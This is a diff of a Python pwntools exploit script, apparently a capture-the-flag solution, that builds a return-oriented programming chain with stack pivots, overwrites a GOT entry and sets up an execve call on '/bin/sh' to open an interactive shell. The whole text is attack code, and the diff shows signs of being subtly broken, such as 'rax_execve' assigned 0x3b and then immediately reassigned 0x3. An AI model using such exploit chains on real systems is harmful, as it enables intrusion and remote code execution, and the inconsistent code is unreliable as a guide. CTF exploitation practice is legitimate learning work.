@@ -21,16 +21,19 @@ buf2 = buf1 + 0x100
 read_got = 0x4004c0
 read_plt = 0x601020
 pop_rsi_r15 = 0x00000000004006b1
+pop_rdi = 0x00000000004006b3
 leave_ret = 0x0000000000400646
 pop_rbx_rbp_r12_r13_r14_r15 = 0x4006aa
 mov_rdx_r13_rsi_r14_edi_r15d_call_QWORD_r12_rbx_8 = 0x400690
+rax_execve = 0x3b
+rax_execve = 0x3
 
 rop = flat([buf1+0x20, rbp_20_read_leave_ret])
 r.recvuntil(':')
 r.send(payload + rop)
 
 # now rax=0, rdi=0x0, rsi=0x601048, rdx=0x40
-rop = flat([pop_rsi_r15, read_plt, '/bin/sh\0', read_got, buf1+0x40+0x20, rbp_20_read_leave_ret])
+rop = flat([pop_rsi_r15, read_plt-rax_execve+1, '/bin/sh\0', read_got, buf1-0x30+0x20, rbp_20_read_leave_ret])
 r.send(rop)
 
 rop = flat([0xdeadbeaf, 0xdeadbeaf, 0xdeadbeaf, 0xdeadbeaf, buf1+0x20+0x20, rbp_20_read_leave_ret])
@@ -44,6 +47,6 @@ r.send(p64(read_got))
 
 input('Press enter to continue.')
 
-r.send(b'\x2e')
+r.send(b'\x2e' * (rax_execve-1) + b'\x2e')
 
 r.interactive()
